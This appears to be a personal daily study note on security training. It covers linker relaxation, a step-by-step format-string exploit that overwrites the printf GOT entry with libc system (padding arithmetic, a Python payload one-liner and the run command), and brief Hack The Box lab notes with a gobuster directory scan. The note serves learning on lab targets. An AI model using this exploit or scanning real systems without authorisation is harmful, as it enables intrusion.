---
title:  "2022-07-03"
tags:
  - daily
  - engineer-training
  - hacking
programming-languagues:
created: 2022-07-03
---
# 2022-07-03
---
## Relaxation
- Most companies do **assembly** relaxation whereas we do **linker** relaxation.

The assembler typically works on one source at a time so it can't see anything that is related to other source code files whereas the linker can. The linker is the more general solution.

## 08
To find **libc** in a remote server: https://libc.blukat.me/ by using the leaked address, for example puts.

We can find the `GOT.printf` address in Ghidra, inside `.got.plt`. We can then write something at it.

### Tutorial
- Need to overwrite 0x0804c00c (`GOT.printf`) with 0xf7dff040 (`LIBC.system`).

- It means writing 0xf7df (63455) @ 0x0804c00c + 2 = 0x0804c00e (high order) and 0xf040 (61504) @ 0x0804c00c (low order).

- Now, we have to figure out the value to set for the padding. Here is the formula :

```
[The value we want] - [The bytes alredy wrote] = [The value to set].            
```                                                                                  

- Let’s start with the low order bytes :                                        

It’ll will be 61504 - 8 = 61496, because we already wrote 8 bytes (the two 4 bytes addresses).

- Then, the high order bytes:                                                  

It’ll will be 63455 - 61504 = 1951, because we already wrote 61504 bytes (the two 4 bytes addresses and 61496 bytes from the previous writing).                                                     

- Now we can construct the exploit (note our write offset is `%4` so we want `[%4,%5]` as offsets instead of `[%7,%8]`):

```
      \x0c\xc0\x04\x08 or 0x0804c00c (in reverse order) points to the low order bytes.    
      \x0e\xc0\x04\x08 or 0x0804c00e (in reverse order) points to the high order bytes.
      %61496x will write 61496 bytes on the standard output.                                              
      %4$hn will write 8 + 61496 = 61504 bytes (or 0xf040) at the first address specified (0x0804c00c).
      %1951x will write 1951 bytes on the standard output.                                                  
      %5$hn will write 8 + 61496 + 1951 = 63455 (or 0xf7df) at the second address specified (0x0804c00e).
```                                                                                            

```python
  python2 -c 'print("\x0c\xc0\x04\x08\x0e\xc0\x04\x08%61496x%4$hn%1951x%5$hn")' > payload
```                                                                                      

  * Based on excellent blogpost: https://axcheron.github.io/exploit-101-format-strings/

```bash
(cat payload; cat) | ./got_overwrite
```

## HTB - Explosion (Starting Point)
- Info on ports [here](https://www.speedguide.net/ports.php).

## HTB - Preignition (Starting Point)
- Dir busting:
```bash
sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -u {ip}
```

## HTB - Bike (Starting Point)
Hacktricks guide ([here](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection))